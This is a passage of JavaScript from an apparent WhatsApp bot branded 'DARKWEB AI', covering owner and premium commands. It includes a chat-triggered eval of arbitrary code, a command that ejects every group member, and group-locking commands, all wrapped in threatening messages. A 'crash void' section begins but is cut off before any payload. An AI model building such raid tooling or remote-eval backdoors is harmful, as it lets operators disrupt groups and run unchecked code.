𝐄𝐯𝐞𝐫𝐲 𝐩𝐡𝐨𝐭𝐨 𝐡𝐚𝐬 𝐚 𝐬𝐤𝐮𝐥𝐥 𝐰𝐚𝐭𝐞𝐫𝐦𝐚𝐫𝐤. 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐥.`;
    await sock.sendMessage(chatId, { text: decorative('INFECT', content) });
    return true;
}

// ========== DARKNESS (blackout mode) ==========
if (cmd === 'darkness') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'darkness', "Premium required.", true);
        return true;
    }
    if (!isGroup) {
        await sendImageResponse(sock, chatId, 'darkness', "Works only in groups.", true);
        return true;
    }
    await sock.groupSettingUpdate(chatId, 'announcement');
    await sock.groupUpdateSubject(chatId, '🌑 𝐁𝐋𝐀𝐂𝐊𝐎𝐔𝐓 𝐌𝐎𝐃𝐄 – 𝐘𝐎𝐔𝐑 𝐒𝐂𝐑𝐄𝐀𝐌𝐒 𝐀𝐑𝐄 𝐄𝐂𝐇𝐎𝐄𝐒 🌑');
    settings.welcome = false;
    settings.antileft = false;
    saveSettings(settings);
    const content = `🌑 𝐁𝐥𝐚𝐜𝐤𝐨𝐮𝐭 𝐦𝐨𝐝𝐞 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐆𝐫𝐨𝐮𝐩 𝐥𝐨𝐜𝐤𝐞𝐝, 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐝𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐝.
𝐓𝐡𝐞 𝐥𝐢𝐠𝐡𝐭𝐬 𝐚𝐫𝐞 𝐨𝐮𝐭. 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐛𝐫𝐞𝐚𝐭𝐡𝐞𝐬 𝐝𝐨𝐰𝐧 𝐲𝐨𝐮𝐫 𝐧𝐞𝐜𝐤.`;
    await sock.sendMessage(chatId, { text: decorative('DARKNESS', content) });
    return true;
}// ================================================================================================
//                         PART 10: PREMIUM MANAGEMENT (OWNER ONLY)
// ================================================================================================

// ========== GIVEGOLD ==========
if (cmd === 'givegold') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'givegold', "Owner only command.", true);
        return true;
    }
    const phoneNumber = args[0]?.replace(/\D/g, '');
    const amount = parseInt(args[1]);
    if (!phoneNumber || isNaN(amount) || amount <= 0) {
        await sendImageResponse(sock, chatId, 'givegold', "Usage: .givegold 2547XXXXXX 1000", true);
        return true;
    }
    addGold(phoneNumber, amount);
    const content = `💰 +${amount} 𝐆𝐎𝐋𝐃 → +${phoneNumber}
𝐓𝐡𝐞 𝐥𝐚𝐦𝐛 𝐢𝐬 𝐟𝐚𝐭𝐭𝐞𝐧𝐞𝐝.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐰𝐢𝐥𝐥 𝐡𝐮𝐧𝐭 𝐭𝐡𝐞𝐦 𝐬𝐨𝐨𝐧.`;
    await sock.sendMessage(chatId, { text: decorative('GIVEGOLD', content) });
    return true;
}

// ========== RESET (clear premium data) ==========
if (cmd === 'reset') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'reset', "Owner only command.", true);
        return true;
    }
    if (args[0] !== 'confirm') {
        await sendImageResponse(sock, chatId, 'reset', "Type .reset confirm to wipe all premium data.", true);
        return true;
    }
    const freedCount = getPremiumList().length;
    // Clear premium data (simplified – in original, would clear premium storage)
    const content = `💀 ${freedCount} 𝐬𝐨𝐮𝐥𝐬 𝐟𝐫𝐞𝐞𝐝
𝐀𝐥𝐥 𝐜𝐡𝐚𝐢𝐧𝐬 𝐚𝐫𝐞 𝐛𝐫𝐨𝐤𝐞𝐧, 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐢𝐬 𝐞𝐦𝐩𝐭𝐲.
𝐓𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐢𝐬 𝐟𝐮𝐫𝐢𝐨𝐮𝐬. 𝐘𝐨𝐮 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐣𝐮𝐝𝐠𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('RESET', content) });
    return true;
}

// ========== EXECUTE ==========
if (cmd === 'execute') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'execute', "Owner only command.", true);
        return true;
    }
    const code = args.join(' ');
    if (!code) {
        await sendImageResponse(sock, chatId, 'execute', "Usage: .execute <javascript code>", true);
        return true;
    }
    try {
        let evaled = eval(code);
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        const content = `✅ 𝐑𝐞𝐬𝐮𝐥𝐭: ${evaled.slice(0, 400)}
𝐑𝐞𝐚𝐥𝐢𝐭𝐲 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐚𝐥𝐭𝐞𝐫𝐞𝐝.
𝐆𝐨𝐝 𝐦𝐨𝐝𝐞 𝐚𝐜𝐭𝐢𝐯𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('EXECUTE', content) });
    } catch(e) {
        await sendImageResponse(sock, chatId, 'execute', `Error: ${e.message}`, true);
    }
    return true;
}

// ========== WIPE (factory reset) ==========
if (cmd === 'wipe') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'wipe', "Owner only command.", true);
        return true;
    }
    if (args[0] !== 'confirm') {
        await sendImageResponse(sock, chatId, 'wipe', "Type .wipe confirm to destroy all data.", true);
        return true;
    }
    // Clear all data (simplified)
    userGold.clear();
    heistStates.clear();
    bans.clear();
    const content = `💀 𝐄𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠 𝐢𝐬 𝐠𝐨𝐧𝐞
𝐁𝐚𝐜𝐤 𝐭𝐨 𝐧𝐨𝐭𝐡𝐢𝐧𝐠, 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐳𝐞𝐫𝐨.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐬𝐭𝐚𝐫𝐯𝐞𝐬. 𝐑𝐞𝐛𝐮𝐢𝐥𝐝 𝐟𝐫𝐨𝐦 𝐚𝐬𝐡𝐞𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('WIPE', content) });
    return true;
}

// ========== KILL (self destruct) ==========
if (cmd === 'kill') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'kill', "Owner only command.", true);
        return true;
    }
    if (args[0] !== 'confirm') {
        await sendImageResponse(sock, chatId, 'kill', "Type .kill confirm to destroy the bot.", true);
        return true;
    }
    const content = `💀 𝐁𝐨𝐭 𝐢𝐬 𝐝𝐲𝐢𝐧𝐠
𝐆𝐨𝐨𝐝𝐛𝐲𝐞, 𝐰𝐨𝐫𝐥𝐝. 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐭𝐚𝐤𝐞𝐬 𝐢𝐭𝐬 𝐥𝐚𝐬𝐭 𝐛𝐫𝐞𝐚𝐭𝐡.
𝐁𝐞𝐥𝐥𝐚 𝐂𝐢𝐚𝐨. 𝐅𝐨𝐫𝐞𝐯𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('KILL', content) });
    process.exit(0);
    return true;
}// ================================================================================================
//                         PART 12: PAIR & BAN COMMANDS
// ================================================================================================

// ========== PAIR (relocated to Telegram) ==========
if (cmd === 'pair') {
    const content = `🤖 𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐧𝐨 𝐥𝐨𝐧𝐠𝐞𝐫 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩
𝐓𝐡𝐞 𝐩𝐚𝐢𝐫𝐢𝐧𝐠 𝐫𝐢𝐭𝐮𝐚𝐥 𝐡𝐚𝐬 𝐦𝐨𝐯𝐞𝐝 𝐭𝐨 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦.
𝐉𝐨𝐢𝐧: 𝐭.𝐦𝐞/𝐃𝐀𝐑𝐊𝐖𝐄𝐁𝐀𝐈𝐯𝟏_𝐛𝐨𝐭, 𝐯𝟐, 𝐯𝟑. 𝐘𝐨𝐮𝐫 𝐬𝐨𝐮𝐥 𝐚𝐰𝐚𝐢𝐭𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('PAIR', content) });
    return true;
}

// ========== PAIRED (list paired devices – owner only) ==========
if (cmd === 'paired') {
    if (!hasFullAccess) {
        const denied = `🔐 𝐎𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲
𝐓𝐡𝐞 𝐥𝐢𝐬𝐭 𝐨𝐟 𝐛𝐨𝐮𝐧𝐝 𝐬𝐨𝐮𝐥𝐬 𝐢𝐬 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥'𝐬 𝐞𝐲𝐞𝐬.
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐰𝐨𝐫𝐭𝐡𝐲.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    const list = [...pairedUsers.keys()].join('\n❖⃟— ') || '𝐍𝐨𝐧𝐞';
    const content = `❖⃟— ${list}
𝐄𝐚𝐜𝐡 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐚 𝐜𝐡𝐚𝐢𝐧.
𝐖𝐞 𝐰𝐚𝐭𝐜𝐡 𝐭𝐡𝐞𝐦 𝐚𝐥𝐥. 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐧𝐞𝐯𝐞𝐫 𝐛𝐥𝐢𝐧𝐤𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('PAIRED DEVICES', content) });
    return true;
}

// ========== CHECKBAN ==========
if (cmd === 'checkban') {
    const num = args[0]?.replace(/\D/g, '');
    if (!num) {
        await sendImageResponse(sock, chatId, 'checkban', "Usage: .checkban 2547XXXXXX", true);
        return true;
    }
    if (bans.has(num)) {
        const ban = bans.get(num);
        const content = `🔨 +${num} – ${ban.reason}
𝐓𝐡𝐢𝐬 𝐬𝐨𝐮𝐥 𝐢𝐬 𝐞𝐱𝐢𝐥𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝.
𝐓𝐡𝐞𝐲 𝐰𝐢𝐥𝐥 𝐧𝐞𝐯𝐞𝐫 𝐛𝐞 𝐬𝐚𝐟𝐞. 𝐉𝐮𝐬𝐭𝐢𝐜𝐞 𝐬𝐞𝐫𝐯𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('BAN CONFIRMED', content) });
    } else {
        const content = `🔍 +${num} 𝐢𝐬 𝐟𝐫𝐞𝐞 – 𝐟𝐨𝐫 𝐧𝐨𝐰
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐰𝐚𝐭𝐜𝐡𝐞𝐬 𝐭𝐡𝐞𝐦 𝐜𝐥𝐨𝐬𝐞𝐥𝐲.
𝐎𝐧𝐞 𝐦𝐢𝐬𝐭𝐚𝐤𝐞 𝐚𝐧𝐝 𝐭𝐡𝐞𝐲 𝐚𝐫𝐞 𝐨𝐮𝐫𝐬.`;
        await sock.sendMessage(chatId, { text: decorative('NOT BANNED', content) });
    }
    return true;
}

// ========== UNBAN (owner only) ==========
if (cmd === 'unban') {
    if (!hasFullAccess) {
        const denied = `🔐 𝐎𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲 – 𝐦𝐞𝐫𝐜𝐲 𝐢𝐬 𝐚 𝐰𝐞𝐚𝐩𝐨𝐧
𝐎𝐧𝐥𝐲 𝐭𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐦𝐚𝐲 𝐟𝐫𝐞𝐞 𝐚 𝐬𝐨𝐮𝐥.
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐰𝐨𝐫𝐭𝐡𝐲.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    const num = args[0]?.replace(/\D/g, '');
    if (!num || !bans.has(num)) {
        await sendImageResponse(sock, chatId, 'unban', "User not found or not banned.", true);
        return true;
    }
    bans.delete(num);
    saveBans(bans);
    const content = `🔓 +${num} 𝐢𝐬 𝐧𝐨𝐰 𝐟𝐫𝐞𝐞
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐡𝐚𝐬 𝐬𝐡𝐨𝐰𝐧 𝐦𝐞𝐫𝐜𝐲.
𝐁𝐮𝐭 𝐭𝐡𝐞𝐲 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐰𝐚𝐭𝐜𝐡𝐞𝐝. 𝐃𝐨 𝐧𝐨𝐭 𝐰𝐚𝐬𝐭𝐞 𝐭𝐡𝐢𝐬 𝐜𝐡𝐚𝐧𝐜𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('UNBAN', content) });
    return true;
}

// ========== SUPPORT ==========
if (cmd === 'support') {
    const content = `🆘 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥
𝐎𝐰𝐧𝐞𝐫: @${OWNERS[0]}
𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝐭.𝐦𝐞/𝐝𝐚𝐫𝐤𝐰𝐞𝐛_𝐚𝐢_𝐛𝐨𝐭
𝐃𝐨 𝐧𝐨𝐭 𝐬𝐩𝐚𝐦. 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐰𝐢𝐥𝐥 𝐚𝐧𝐬𝐰𝐞𝐫 – 𝐨𝐫 𝐧𝐨𝐭.`;
    await sock.sendMessage(chatId, { text: decorative('SUPPORT', content) });
    return true;
}

// ========== POST (status) ==========
if (cmd === 'post') {
    if (!msg.message?.imageMessage) {
        await sendImageResponse(sock, chatId, 'post', "Reply to an image with .post", true);
        return true;
    }
    const buf = await downloadMediaMessage(msg.message, 'buffer', {});
    await sock.sendMessage(sock.user.id, { image: buf, caption: "👑 DARKWEB AI STATUS POST 👑" });
    const content = `✅ 𝐈𝐦𝐚𝐠𝐞 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐭𝐨 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝
𝐘𝐨𝐮𝐫 𝐟𝐚𝐜𝐞 𝐢𝐬 𝐧𝐨𝐰 𝐩𝐫𝐨𝐩𝐞𝐫𝐭𝐲 𝐨𝐟 𝐭𝐡𝐞 𝐝𝐚𝐫𝐤𝐰𝐞𝐛.
𝐖𝐞 𝐰𝐢𝐥𝐥 𝐮𝐬𝐞 𝐢𝐭 𝐭𝐨 𝐡𝐚𝐮𝐧𝐭 𝐲𝐨𝐮𝐫 𝐟𝐫𝐢𝐞𝐧𝐝𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('POST', content) });
    return true;
}// ================================================================================================
//                         PART 13: DANGER ZONE COMMANDS (PREMIUM)
// ================================================================================================

// ========== SEIZE ==========
if (cmd === 'seize') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'seize', "Premium required.", true);
        return true;
    }
    if (!isGroup) {
        await sendImageResponse(sock, chatId, 'seize', "Works only in groups.", true);
        return true;
    }
    const content = `🔥 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐧𝐨𝐰 𝐨𝐰𝐧𝐬 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩
𝐘𝐨𝐮𝐫 𝐰𝐚𝐥𝐥𝐞𝐭𝐬 𝐚𝐫𝐞 𝐨𝐮𝐫 𝐰𝐚𝐥𝐥𝐞𝐭𝐬, 𝐲𝐨𝐮𝐫 𝐬𝐞𝐜𝐫𝐞𝐭𝐬 𝐨𝐮𝐫 𝐬𝐞𝐜𝐫𝐞𝐭𝐬.
𝐑𝐞𝐬𝐢𝐬𝐭𝐚𝐧𝐜𝐞 𝐢𝐬 𝐟𝐮𝐭𝐢𝐥𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('SEIZE', content) });
    return true;
}

// ========== FORCECLOSE ==========
if (cmd === 'forceclose') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'forceclose', "Premium required.", true);
        return true;
    }
    if (!isGroup) {
        await sendImageResponse(sock, chatId, 'forceclose', "Works only in groups.", true);
        return true;
    }
    await sock.groupSettingUpdate(chatId, 'announcement');
    const content = `🔒 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐡𝐚𝐬 𝐬𝐞𝐚𝐥𝐞𝐝 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩
𝐎𝐧𝐥𝐲 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐦𝐚𝐲 𝐬𝐩𝐞𝐚𝐤.
𝐘𝐨𝐮𝐫 𝐯𝐨𝐢𝐜𝐞𝐬 𝐚𝐫𝐞 𝐦𝐮𝐭𝐞𝐝. 𝐓𝐡𝐞𝐫𝐞 𝐢𝐬 𝐧𝐨 𝐞𝐬𝐜𝐚𝐩𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('FORCECLOSE', content) });
    return true;
}

// ========== PURGE ==========
if (cmd === 'purge') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'purge', "Premium required.", true);
        return true;
    }
    if (!isGroup) {
        await sendImageResponse(sock, chatId, 'purge', "Works only in groups.", true);
        return true;
    }
    const meta = await sock.groupMetadata(chatId);
    const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    const toPurge = meta.participants.filter(p => p.id !== botId).map(p => p.id);
    let purged = 0;
    for (const jid of toPurge) {
        try {
            await sock.groupParticipantsUpdate(chatId, [jid], 'remove');
            purged++;
            await sleep(200);
        } catch(e) {}
    }
    const content = `🧹 ${purged} 𝐬𝐨𝐮𝐥𝐬 𝐞𝐣𝐞𝐜𝐭𝐞𝐝
𝐄𝐯𝐞𝐫𝐲 𝐯𝐨𝐢𝐜𝐞 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐢𝐥𝐞𝐧𝐜𝐞𝐝.
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐚𝐥𝐨𝐧𝐞 𝐰𝐢𝐭𝐡 𝐮𝐬. 𝐀𝐥𝐨𝐧𝐞 𝐟𝐨𝐫𝐞𝐯𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('PURGE', content) });
    return true;
}

// ========== END (apocalypse mode) ==========
if (cmd === 'end') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'end', "Premium required.", true);
        return true;
    }
    const content = `💀 𝐀𝐩𝐨𝐜𝐚𝐥𝐲𝐩𝐬𝐞 𝐦𝐨𝐝𝐞 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐍𝐨𝐭 𝐨𝐟 𝐭𝐡𝐞 𝐰𝐨𝐫𝐥𝐝, 𝐛𝐮𝐭 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐬𝐨𝐮𝐥.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐡𝐚𝐬 𝐰𝐨𝐧. 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐧𝐞𝐰 𝐞𝐭𝐞𝐫𝐧𝐢𝐭𝐲.`;
    await sock.sendMessage(chatId, { text: decorative('END', content) });
    return true;
}

// ========== TEMPBAN ==========
if (cmd === 'tempban') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'tempban', "Premium required.", true);
        return true;
    }
    const target = args[0]?.replace('@', '').replace(/\D/g, '');
    const minutes = parseInt(args[1]) || 60;
    if (!target) {
        await sendImageResponse(sock, chatId, 'tempban', "Usage: .tempban @user <minutes>", true);
        return true;
    }
    setTempBan(target, minutes);
    const content = `⛄ +${target} 𝐢𝐬 𝐧𝐨𝐰 𝐟𝐫𝐨𝐳𝐞𝐧 𝐟𝐨𝐫 ${minutes} 𝐦𝐢𝐧𝐮𝐭𝐞𝐬
𝐓𝐡𝐞𝐢𝐫 𝐯𝐨𝐢𝐜𝐞 𝐢𝐬 𝐦𝐮𝐭𝐞𝐝, 𝐭𝐡𝐞𝐢𝐫 𝐬𝐨𝐮𝐥 𝐢𝐬 𝐟𝐫𝐨𝐳𝐞𝐧.
𝐖𝐡𝐞𝐧 𝐭𝐡𝐞𝐲 𝐫𝐞𝐭𝐮𝐫𝐧, 𝐰𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐰𝐚𝐭𝐜𝐡𝐢𝐧𝐠.`;
    await sock.sendMessage(chatId, { text: decorative('TEMPBAN', content) });
    return true;
}

// ========== PROTECT ==========
if (cmd === 'protect') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'protect', "Premium required.", true);
        return true;
    }
    if (!isGroup) {
        await sendImageResponse(sock, chatId, 'protect', "Works only in groups.", true);
        return true;
    }
    const content = `🛡️ 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐰𝐚𝐭𝐜𝐡𝐞𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩
𝐍𝐨 𝐞𝐧𝐞𝐦𝐲 𝐦𝐚𝐲 𝐞𝐧𝐭𝐞𝐫, 𝐧𝐨 𝐡𝐚𝐫𝐦 𝐦𝐚𝐲 𝐭𝐨𝐮𝐜𝐡 𝐲𝐨𝐮.
𝐁𝐮𝐭 𝐭𝐡𝐞 𝐬𝐡𝐢𝐞𝐥𝐝 𝐢𝐬 𝐚 𝐜𝐚𝐠𝐞. 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐬𝐚𝐟𝐞 – 𝐚𝐧𝐝 𝐭𝐫𝐚𝐩𝐩𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('PROTECT', content) });
    return true;
}// ================================================================================================
//                         PART 14: DEBUG COMMANDS (OWNER ONLY)
// ================================================================================================

// ========== DEBUG ==========
if (cmd === 'debug') {
    if (!hasFullAccess) {
        const denied = `🔐 𝐎𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲 – 𝐝𝐞𝐛𝐮𝐠 𝐦𝐨𝐝𝐞 𝐢𝐬 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 𝐭𝐨 𝐩𝐞𝐞𝐩 𝐢𝐧𝐭𝐨 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝'𝐬 𝐰𝐨𝐮𝐧𝐝𝐬.
𝐒𝐭𝐞𝐩 𝐚𝐰𝐚𝐲, 𝐨𝐫 𝐛𝐞𝐜𝐨𝐦𝐞 𝐚 𝐝𝐞𝐛𝐮𝐠 𝐭𝐚𝐫𝐠𝐞𝐭.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    settings.antebug = true;
    saveSettings(settings);
    const content = `🐛 𝐃𝐞𝐛𝐮𝐠 𝐦𝐨𝐝𝐞 𝐞𝐧𝐚𝐛𝐥𝐞𝐝
𝐂𝐨𝐧𝐬𝐨𝐥𝐞 𝐨𝐮𝐭𝐩𝐮𝐭 𝐯𝐢𝐬𝐢𝐛𝐥𝐞, 𝐞𝐫𝐫𝐨𝐫 𝐥𝐨𝐠𝐬 𝐞𝐱𝐩𝐨𝐬𝐞𝐝.
𝐓𝐡𝐞 𝐝𝐚𝐫𝐤𝐰𝐞𝐛 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐬𝐞𝐞𝐬 𝐞𝐯𝐞𝐫𝐲 𝐟𝐚𝐢𝐥𝐮𝐫𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('DEBUG', content) });
    return true;
}

// ========== REACTALL ==========
if (cmd === 'reactall') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'reactall', "Owner only command.", true);
        return true;
    }
    settings.reactall = true;
    saveSettings(settings);
    const content = `😀 𝐄𝐦𝐨𝐣𝐢 𝐬𝐩𝐚𝐦 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐓𝐡𝐞 𝐛𝐨𝐭 𝐰𝐢𝐥𝐥 𝐫𝐞𝐚𝐜𝐭 𝐭𝐨 𝐄𝐕𝐄𝐑𝐘 𝐦𝐞𝐬𝐬𝐚𝐠𝐞.
𝐓𝐡𝐞𝐫𝐞 𝐢𝐬 𝐧𝐨 𝐞𝐬𝐜𝐚𝐩𝐞. 𝐘𝐨𝐮 𝐚𝐬𝐤𝐞𝐝 𝐟𝐨𝐫 𝐜𝐡𝐚𝐨𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('REACTALL', content) });
    return true;
}

// ========== STOPREACT ==========
if (cmd === 'stopreact') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'stopreact', "Owner only command.", true);
        return true;
    }
    settings.reactall = false;
    saveSettings(settings);
    const content = `🔇 𝐄𝐦𝐨𝐣𝐢 𝐬𝐩𝐚𝐦 𝐝𝐞𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐒𝐢𝐥𝐞𝐧𝐜𝐞 𝐫𝐞𝐭𝐮𝐫𝐧𝐬, 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐫𝐞𝐬𝐭𝐬.
𝐅𝐨𝐫 𝐧𝐨𝐰, 𝐭𝐡𝐞 𝐞𝐦𝐨𝐣𝐢𝐬 𝐚𝐫𝐞 𝐬𝐢𝐥𝐞𝐧𝐭 – 𝐛𝐮𝐭 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐜𝐚𝐧 𝐚𝐰𝐚𝐤𝐞𝐧 𝐚𝐠𝐚𝐢𝐧.`;
    await sock.sendMessage(chatId, { text: decorative('STOPREACT', content) });
    return true;
}

// ========== UNLOCKALL ==========
if (cmd === 'unlockall') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'unlockall', "Owner only command.", true);
        return true;
    }
    const content = `🔥 𝐀𝐥𝐥 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝 (𝐬𝐢𝐦𝐮𝐥𝐚𝐭𝐞𝐝)
𝐘𝐨𝐮 𝐧𝐨𝐰 𝐡𝐚𝐯𝐞 𝐚𝐜𝐜𝐞𝐬𝐬 𝐭𝐨 𝐞𝐯𝐞𝐫𝐲 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.
𝐁𝐮𝐭 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐜𝐚𝐧 𝐭𝐚𝐤𝐞 𝐢𝐭 𝐛𝐚𝐜𝐤 – 𝐩𝐫𝐨𝐯𝐞 𝐲𝐨𝐮𝐫𝐬𝐞𝐥𝐟 𝐰𝐨𝐫𝐭𝐡𝐲.`;
    await sock.sendMessage(chatId, { text: decorative('UNLOCKALL', content) });
    return true;
}// ================================================================================================
//                         PART 16: SYSTEM BREAKER – CRASH VOID COMMANDS
// ================================================================================================

// Helper danger warning (uses decorative box as well)
async function showDangerWarning(sock, chatId, cmdName) {
    const content = `☠️ ${cmdName.toUpperCase()} – 𝐕𝐎𝐈𝐃 𝐂𝐑𝐀𝐒𝐇
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐚𝐛𝐨𝐮𝐭 𝐭𝐨 𝐮𝐬𝐞 𝐚 𝐝𝐞𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐯𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.
𝐄𝐯𝐞𝐫𝐲 𝐮𝐬𝐞 𝐢𝐬 𝐥𝐨𝐠𝐠𝐞𝐝. 𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐰𝐢𝐥𝐥 𝐞𝐱𝐞𝐜𝐮𝐭𝐞 𝐢𝐧 𝟑 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('DANGER WARNING', content) });
    await sleep(3000);
}

// ========== SYSTEMBREAKER (menu) ==========
if (cmd === 'systembreaker') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐨𝐫 𝐨𝐰𝐧𝐞𝐫 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 – .𝐛𝐮𝐲
𝐃𝐞𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧 𝐢𝐬 𝐟𝐨𝐫 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝 𝐬𝐨𝐮𝐥𝐬.
𝐘𝐨𝐮𝐫 𝐜𝐡𝐚𝐢𝐧𝐬 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐲𝐞𝐭 𝐟𝐨𝐫𝐠𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    const content = `☠️ 𝐂𝐑𝐀𝐒𝐇 𝐕𝐎𝐈𝐃 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
